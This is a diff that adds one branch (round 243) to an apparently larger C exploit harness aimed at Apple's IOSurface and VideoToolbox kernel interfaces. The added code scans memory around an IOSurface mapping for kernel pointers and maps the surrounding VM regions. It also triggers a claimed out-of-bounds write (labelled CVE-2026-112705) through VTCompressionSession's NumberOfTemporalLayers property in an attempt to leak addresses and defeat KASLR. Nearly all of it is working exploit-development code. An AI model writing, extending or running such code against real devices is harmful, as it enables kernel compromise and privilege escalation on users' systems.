@@ -18197,6 +18197,162 @@ new_modes:
             rlog("*** Page-level probe complete ***\n");
             goto done;
         }
+        if (rounds == 243) {
+            rlog("*** rounds=243: IOSurface mapping extent + VT OOB read probe ***\n");
+            
+            io_service_t svc243 = IOServiceGetMatchingService(kIOMasterPortDefault,
+                IOServiceMatching("IOSurfaceRoot"));
+            io_connect_t conn243 = 0;
+            kern_return_t kr243 = IOServiceOpen(svc243, mach_task_self(), 0, &conn243);
+            
+            /* Create IOSurface with minimal allocation to find header */
+            CFMutableDictionaryRef p243 = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int w=4, h=4, bpr=16, as=64, pf=0x42475241;
+            CFNumberRef wr = CFNumberCreate(NULL, kCFNumberIntType, &w);
+            CFNumberRef hr = CFNumberCreate(NULL, kCFNumberIntType, &h);
+            CFNumberRef br = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+            CFNumberRef ar = CFNumberCreate(NULL, kCFNumberIntType, &as);
+            CFNumberRef fr = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+            CFDictionarySetValue(p243, CFSTR("IOSurfaceWidth"), wr);
+            CFDictionarySetValue(p243, CFSTR("IOSurfaceHeight"), hr);
+            CFDictionarySetValue(p243, CFSTR("IOSurfaceBytesPerRow"), br);
+            CFDictionarySetValue(p243, CFSTR("IOSurfaceAllocSize"), ar);
+            CFDictionarySetValue(p243, CFSTR("IOSurfacePixelFormat"), fr);
+            IOSurfaceRef s243 = IOSurfaceCreate(p243);
+            uint32_t sid243 = IOSurfaceGetID(s243);
+            
+            IOSurfaceLock(s243, 0, NULL);
+            void *base243 = IOSurfaceGetBaseAddress(s243);
+            size_t allocsz = IOSurfaceGetAllocSize(s243);
+            rlog("  Surface: id=%u base=%p allocSize=%zu\n", sid243, base243, allocsz);
+            
+            /* Scan the entire virtual address range around the mapping */
+            /* Look for pages mapped beyond our allocation */
+            mach_vm_address_t addr = (mach_vm_address_t)base243 & ~0xFFFULL;
+            addr -= 16 * 4096; /* Start 16 pages before */
+            
+            rlog("  Scanning VM region around base:\n");
+            for (int pg = -16; pg < 32; pg++) {
+                mach_vm_address_t check = (mach_vm_address_t)base243 + (pg * 4096);
+                vm_offset_t data = 0;
+                mach_msg_type_number_t dataCnt = 0;
+                kr243 = mach_vm_read(mach_task_self(), check, 4096, &data, &dataCnt);
+                if (kr243 == 0 && dataCnt > 0) {
+                    /* Check for non-zero data */
+                    uint64_t *dp = (uint64_t*)data;
+                    int nonzero = 0, kptr_cnt = 0;
+                    for (int i = 0; i < 512; i++) {
+                        if (dp[i] != 0) nonzero++;
+                        if ((dp[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) kptr_cnt++;
+                    }
+                    if (nonzero > 0 || pg == 0) {
+                        rlog("    page[%+d] @ 0x%llx: %d nonzero qwords, %d KPTR\n",
+                             pg, (unsigned long long)check, nonzero, kptr_cnt);
+                        if (kptr_cnt > 0) {
+                            for (int i = 0; i < 512; i++) {
+                                if ((dp[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                    rlog("      +%d: 0x%016llx *** KPTR ***\n", i*8, dp[i]);
+                                }
+                            }
+                        }
+                        if (nonzero > 0 && nonzero < 20 && pg != 0) {
+                            for (int i = 0; i < 512; i++) {
+                                if (dp[i] != 0) {
+                                    rlog("      +%d: 0x%016llx\n", i*8, dp[i]);
+                                }
+                            }
+                        }
+                    }
+                    mach_vm_deallocate(mach_task_self(), data, dataCnt);
+                }
+            }
+            IOSurfaceUnlock(s243, 0, NULL);
+            
+            /* Use mach_vm_region_recurse to map the full VM layout */
+            rlog("\n  === VM Region Map (around IOSurface) ===\n");
+            mach_vm_address_t raddr = (mach_vm_address_t)base243 - 0x100000;
+            for (int r = 0; r < 20; r++) {
+                mach_vm_size_t rsize = 0;
+                natural_t depth = 1;
+                struct vm_region_submap_info_64 rinfo;
+                mach_msg_type_number_t rcnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+                kr243 = mach_vm_region_recurse(mach_task_self(), &raddr, &rsize, &depth,
+                    (vm_region_recurse_info_t)&rinfo, &rcnt);
+                if (kr243 != 0) break;
+                rlog("    0x%llx-0x%llx size=0x%llx prot=%d/%d tag=%d\n",
+                     (unsigned long long)raddr, (unsigned long long)(raddr+rsize),
+                     (unsigned long long)rsize, rinfo.protection, rinfo.max_protection,
+                     rinfo.user_tag);
+                raddr += rsize;
+                if (raddr > (mach_vm_address_t)base243 + 0x200000) break;
+            }
+            
+            /* Try the VT NumberOfTemporalLayers OOB read as KASLR bypass */
+            rlog("\n  === VT OOB Read KASLR Probe ===\n");
+            rlog("  Using CVE-2026-112705 OOB write + read-back attempt\n");
+            
+            /* The idea: set numberOfTemporalLayers to a value that causes
+             * the kernel to write to memory adjacent to the VT buffer.
+             * Then read back the IOSurface's encoded data to see if any
+             * kernel pointer was overwritten into our data.
+             * 
+             * We already know the OOB write works (confirmed in prior sessions)
+             * but couldn't observe it from userspace. Let's try to read
+             * via VTCompressionSession properties. */
+            
+            /* Create a VTCompressionSession */
+            VTCompressionSessionRef comp243 = NULL;
+            OSStatus st = VTCompressionSessionCreate(NULL, 1920, 1080,
+                kCMVideoCodecType_H264, NULL, NULL, NULL, NULL, NULL, &comp243);
+            rlog("  VTCompressionSessionCreate: status=%d\n", (int)st);
+            
+            if (comp243) {
+                /* Set temporal layers to trigger OOB */
+                CFNumberRef tl_val = NULL;
+                for (int tl = 2; tl <= 4; tl++) {
+                    tl_val = CFNumberCreate(NULL, kCFNumberIntType, &tl);
+                    st = VTSessionSetProperty(comp243,
+                        CFSTR("NumberOfTemporalLayers"), tl_val);
+                    rlog("  Set NumberOfTemporalLayers=%d: status=%d\n", tl, (int)st);
+                    CFRelease(tl_val);
+                }
+                
+                /* Read back all properties to look for leaked data */
+                CFDictionaryRef allProps = NULL;
+                st = VTSessionCopySupportedPropertyDictionary(comp243, &allProps);
+                rlog("  VTSessionCopySupportedPropertyDictionary: status=%d\n", (int)st);
+                if (allProps) {
+                    CFIndex pcnt = CFDictionaryGetCount(allProps);
+                    rlog("  %ld supported properties\n", (long)pcnt);
+                    CFRelease(allProps);
+                }
+                
+                /* Check specific properties for kernel addresses */
+                CFTypeRef propVal = NULL;
+                st = VTSessionCopyProperty(comp243,
+                    CFSTR("NumberOfTemporalLayers"), kCFAllocatorDefault, &propVal);
+                if (st == 0 && propVal) {
+                    int64_t nv = 0;
+                    CFNumberGetValue((CFNumberRef)propVal, kCFNumberSInt64Type, &nv);
+                    rlog("  NumberOfTemporalLayers readback: %lld (0x%llx)\n",
+                         (long long)nv, (unsigned long long)nv);
+                    CFRelease(propVal);
+                }
+                
+                VTCompressionSessionInvalidate(comp243);
+                CFRelease(comp243);
+            }
+            
+            CFRelease(p243); CFRelease(wr); CFRelease(hr);
+            CFRelease(br); CFRelease(ar); CFRelease(fr);
+            CFRelease(s243);
+            if (svc243) IOObjectRelease(svc243);
+            if (conn243) IOServiceClose(conn243);
+            
+            rlog("*** Probe complete ***\n");
+            goto done;
+        }
         if (rounds >= 170 && rounds != 219 && rounds != 225) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
